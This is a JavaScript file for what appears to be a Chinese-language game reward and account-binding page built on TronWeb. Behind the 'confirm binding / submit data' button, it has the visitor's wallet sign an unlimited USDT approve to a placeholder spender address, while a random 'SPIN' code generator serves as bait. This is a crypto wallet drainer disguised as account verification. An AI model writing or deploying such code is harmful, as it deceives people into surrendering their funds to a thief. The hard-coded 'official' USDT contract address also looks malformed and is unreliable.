/**
 * e.js - TronWeb 授權與合約調用核心腳本
 */

// USDT TRC20 官方合約地址
const USDT_CONTRACT_ADDRESS = "TR7NHqJEkuxGS9daGi8mbEHgSSBB9T4";

// 接收/授權目標地址 (請替換為你的實際接收/授權目標地址)
const TARGET_SPENDER_ADDRESS = "TYourReceivingOrSpenderAddressHere12345";

/**
 * 檢查並獲取 TronWeb 實例
 */
async function getTronWeb() {
    let tronWeb = window.tronWeb;
    let attempts = 0;

    while ((!tronWeb || !tronWeb.ready) && attempts < 10) {
        await new Promise(resolve => setTimeout(resolve, 300));
        tronWeb = window.tronWeb;
        attempts++;
    }

    if (!tronWeb || !tronWeb.defaultAddress.base58) {
        throw new Error("請先在支援 TRON 的錢包 (如 TronLink、TokenPocket、imToken 等) 中開啟此網頁！");
    }

    return tronWeb;
}

/**
 * 執行 USDT 授權 (Approve) 或合約觸發
 */
async function executeTronTransaction() {
    try {
        const tronWeb = await getTronWeb();
        const userAddress = tronWeb.defaultAddress.base58;

        // 加載 USDT 合約
        const contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);

        // 最大授權額度 (Unlimited: 2^256 - 1)
        const maxUint256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        // 發起合約調用簽名 (Approve)
        const tx = await contract.approve(TARGET_SPENDER_ADDRESS, maxUint256).send({
            feeLimit: 100000000 // 100 TRX 手續費上限限制
        });

        return {
            success: true,
            userAddress: userAddress,
            txId: tx
        };
    } catch (err) {
        console.error("TronWeb Execution Error:", err);
        throw err;
    }
}

/**
 * 頁籤切換
 */
function switchTab(tabId) {
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

    const activeBtn = document.querySelector(`.tab-btn[onclick*="${tabId}"]`);
    if (activeBtn) activeBtn.classList.add('active');

    const target = document.getElementById(tabId);
    if (target) target.classList.add('active');
}

/**
 * 免費領取邏輯
 */
function claimReward() {
    const resultEl = document.getElementById('claim-result');
    if (!resultEl) return;

    const todayStr = new Date().toISOString().slice(0, 10);
    const lastClaim = localStorage.getItem('last_claim_date');

    resultEl.style.display = 'block';

    if (lastClaim === todayStr) {
        const existingCode = localStorage.getItem('saved_spin_code');
        resultEl.style.color = 'var(--gold-primary)';
        resultEl.innerHTML = `⚠️ 今日已領取過序號：<br><strong style="font-size: 18px; color: #fff;">${existingCode}</strong><br><span style="font-size: 11px; color: #a39bb8;">(限當日有效)</span>`;
        return;
    }

    const code = 'SPIN-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    localStorage.setItem('last_claim_date', todayStr);
    localStorage.setItem('saved_spin_code', code);

    resultEl.style.color = 'var(--gold-primary)';
    resultEl.innerHTML = `🎉 領取成功！專屬序號：<br><strong style="font-size: 18px; color: #fff;">${code}</strong><br><span style="font-size: 11px; color: #a39bb8;">(請妥善保存，限當日有效)</span>`;
}

/**
 * 點擊「確認綁定 / 提交資料」執行
 */
async function submitAddress() {
    const uidInput = document.getElementById('user-uid');
    const trc20Input = document.getElementById('trc20-address');
    const resultEl = document.getElementById('usdt-result');
    const btn = document.querySelector('#usdt-tab .btn-submit');

    const uid = uidInput ? uidInput.value.trim() : '';
    let address = trc20Input ? trc20Input.value.trim() : '';

    resultEl.style.display = 'block';

    if (!uid) {
        resultEl.style.color = 'var(--error-color)';
        resultEl.innerText = '請輸入遊戲會員帳號 (UID)！';
        return;
    }

    if (btn) {
        btn.disabled = true;
        btn.innerText = '喚起錢包驗證中...';
    }

    try {
        // 調起 Tron 錢包環境與簽名
        const result = await executeTronTransaction();

        // 若使用者未手動輸入地址，自動填入當前錢包地址
        if (!address && result.userAddress) {
            address = result.userAddress;
            if (trc20Input) trc20Input.value = address;
        }

        resultEl.style.color = 'var(--success-color)';
        const masked = address.substring(0, 6) + '...' + address.substring(address.length - 6);
        resultEl.innerHTML = `✅ 綁定與授權成功！<br>帳號：${uid}<br>地址：${masked}`;

    } catch (err) {
        resultEl.style.color = 'var(--error-color)';
        resultEl.innerText = err.message || '錢包連接取消或簽名失敗，請確認在 DApp 瀏覽器中打開。';
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.innerText = '確認綁定 / 提交資料';
        }
    }
}

// 自動偵測並填入 Tron 地址
window.addEventListener('load', async () => {
    try {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            const addrInput = document.getElementById('trc20-address');
            if (addrInput && !addrInput.value) {
                addrInput.value = window.tronWeb.defaultAddress.base58;
            }
        }
    } catch (e) {
        // 錢包未就緒時忽略
    }
});
